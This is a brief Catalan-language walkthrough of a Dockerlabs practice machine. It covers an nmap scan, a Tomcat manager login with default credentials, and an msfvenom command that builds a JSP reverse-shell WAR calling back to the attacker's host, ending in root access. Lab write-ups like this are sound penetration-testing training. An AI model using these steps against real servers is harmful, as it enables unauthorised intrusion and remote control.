# PN

Plataforma: Dockerlabs
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 5 de diciembre de 2024 17:37

### Reconeixement

```bash
sudo nmap -p- -sS -sCV --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports
```

No troba res
Provem a treure el parametre -Pn

![image.png](<imagenes/image 76.png>)

Ens conectem a la web i trobem un tomcat

![image.png](<imagenes/image 77.png>)

Provem a accedir al panell manager.
Demana login
Provem amb credencials per defecte:

![image.png](<imagenes/image 78.png>)

Accedirm amb tomact:s3cr3t

Un cop a dins , mirem de pujar un fitxer .war

Creem el payload amb :

msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.1.7 lport=1234 -f war > shell.war

Pujem el fitxer :

.

![image.png](<imagenes/image 79.png>)

Explotem la shell

![image.png](<imagenes/image 80.png>)

Entrem com a root